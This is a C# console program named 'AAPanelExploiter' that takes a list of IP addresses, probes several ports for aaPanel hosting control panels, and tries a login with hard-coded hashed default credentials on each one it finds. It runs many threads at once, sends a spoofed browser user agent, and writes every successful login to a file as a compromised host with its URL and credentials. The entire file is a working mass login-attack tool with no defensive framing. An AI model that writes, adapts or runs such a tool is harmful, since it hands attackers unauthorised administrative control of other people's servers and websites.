using Spectre.Console;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace AAPanelExploiter
{
    internal static class Program
    {
        private static List<string> VulnsInputted = new List<string>();
        private static readonly object LogLock = new object();
        private static int VulnsScanned = 0;
        private static int Vulns = 0;
        private static int VulnsFailed = 0;
        private static int Threads = 0;
        private static string fileName = "vulns.txt";
        private static string Date = DateTime.Now.ToString("MM-dd-yyyy HH-mm-ss");
        private static readonly string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
        static void UpdateTitle()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                Console.Title = $"Vulns Checked: {VulnsScanned}/{VulnsInputted.Count} Good: {Vulns} Failed:{VulnsFailed}";
        }

        [STAThread]
        static void Main(string[] args)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Threads = Convert.ToInt32(args[0]);

                if (args.Length > 1)
                {
                    fileName = args[1];
                }
            }

            AnsiConsole.Write(
                new FigletText("VulnChecker")
                    .LeftJustified()
                    .Color(Color.Magenta2));

            if (!File.Exists(fileName))
            {
                AnsiConsole.Write(new Markup($"[red]ERROR: {fileName} is missing.[/]"));
                Environment.Exit(0);
            }
            else
            {
                VulnsInputted = File.ReadAllLines(fileName).Distinct().ToList();
            }

            if (!VulnsInputted.Any())
            {
                AnsiConsole.Write(new Markup($"[red]ERROR: we have no proxies to test.[/]"));
                Environment.Exit(0);
            }

            if (Threads == 0)
            {
                Threads = AnsiConsole.Ask<int>("How many [yellow]threads[/] ?");
            }

            AnsiConsole.Write(new Markup($"[yellow]Okay. {Threads}[/]\n"));

            Task.Run(() => PrintAccountProgress());

            Task.Run(() => MainJob(Threads)).Wait();
        }

        public static async void PrintAccountProgress()
        {
            try
            {
                await AnsiConsole.Progress()
                .AutoRefresh(true) // Turn off auto refresh
                .AutoClear(false)   // Do not remove the task list when done
                .HideCompleted(false)   // Hide tasks as they are completed
                .Columns(new ProgressColumn[]
                {
                new TaskDescriptionColumn(),    // Task description
                new ProgressBarColumn(),        // Progress bar
                new PercentageColumn(),         // Percentage
                new SpinnerColumn(Spinner.Known.Weather),            // Spinner
                })
                .StartAsync(async ctx =>
                {
                    var task1 = ctx.AddTask("[blue]Vulns Checked[/]", true, VulnsInputted.Count);

                    while (!ctx.IsFinished)
                    {
                        task1.Value = VulnsScanned;
                        await Task.Delay(100);
                    }
                });
            }
            catch (Exception)
            {
            }
        }
        public class HackerJson
        {
            public bool status { get; set; }
            public string msg { get; set; }
        }
        static async Task MainJob(int threads)
        {
            using HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", UserAgent);

            int threadLimit = threads;  // Change this to the number of threads you want
            SemaphoreSlim throttler = new SemaphoreSlim(threadLimit, threadLimit);

            List<Task> tasks = new List<Task>();

            foreach (var currentIP in VulnsInputted)
            {
                await throttler.WaitAsync();

                tasks.Add(
                    Task.Run(async () =>
                    {
                        try
                        {
                            await ScanIP(currentIP, httpClient);
                        }
                        finally
                        {
                            throttler.Release();
                        }
                    })
                );
            }

            await Task.WhenAll(tasks);
        }

        static async Task ScanIP(string currentIP, HttpClient httpClient)
        {
            int[] ports = { 8886, 9999, 8200, 7800 };
            bool vulnFound = false;

            foreach (int port in ports)
            {
                try
                {
                    var url = $"http://{currentIP}:{port}/aapanel/";
                    var HttpResponse = await httpClient.GetAsync(url);

                    if (HttpResponse.StatusCode == HttpStatusCode.OK)
                    {
                        string HttpContent = await HttpResponse.Content.ReadAsStringAsync();

                        if (HttpContent != null && HttpContent.Contains("aaPanel Linux panel"))
                        {
                            // Set the request headers
                            httpClient.DefaultRequestHeaders.Clear();
                            httpClient.DefaultRequestHeaders.Add("Proxy-Connection", "keep-alive");
                            httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
                            httpClient.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                            httpClient.DefaultRequestHeaders.Add("User-Agent", UserAgent);
                            httpClient.DefaultRequestHeaders.Add("Origin", $"http://{currentIP}:{port}");
                            httpClient.DefaultRequestHeaders.Add("Referer", $"http://{currentIP}:{port}/aapanel/");
                            httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate");
                            httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.9");

                            // Build the request body
                            var formData = new Dictionary<string, string>
                            {
                                { "username", "1409b5695a9824a10a6b95b0102afa0e" },
                                { "password", "f7b6a1a65929f3b19ec0663fc142d609" },
                                { "code", "" }
                            };

                            var content = new FormUrlEncodedContent(formData);
                            content.Headers.Clear(); // Clear default Content-Type header
                            content.Headers.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

                            // Send the POST request
                            url = $"http://{currentIP}:{port}/login";
                            var response = await httpClient.PostAsync(url, content);

                            // Get the response content as string
                            var responseContent = await response.Content.ReadAsStringAsync();

                            // Output the response
                            var json = JsonSerializer.Deserialize<HackerJson>(responseContent);

                            if (json != null && json.msg == "Login succeeded, loading...")
                            {
                                vulnFound = true;
                                Interlocked.Increment(ref Vulns);
                                AnsiConsole.Write(new Markup($"[green]{currentIP}:{port} IP VULN[/]"));
                                Log($"vulns-{Date}.txt", $"http://{currentIP}:{port}/aapanel/:aapanel:aapanel123");
                            }
                        }
                    }
                    else
                    {
                        Interlocked.Increment(ref VulnsFailed);
                    }
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref VulnsFailed);
                }
            }

            if (!vulnFound)
            {
                Interlocked.Increment(ref VulnsFailed);
            }

            Interlocked.Increment(ref VulnsScanned);
            UpdateTitle();
        }

        static void Log(string fileName, string message)
        {
            try
            {
                lock (LogLock)
                {
                    using (var stream = new StreamWriter(fileName, true))
                    {
                        stream.WriteLine(message);
                    }
                }
            }
            catch (Exception) { }
        }
    }
}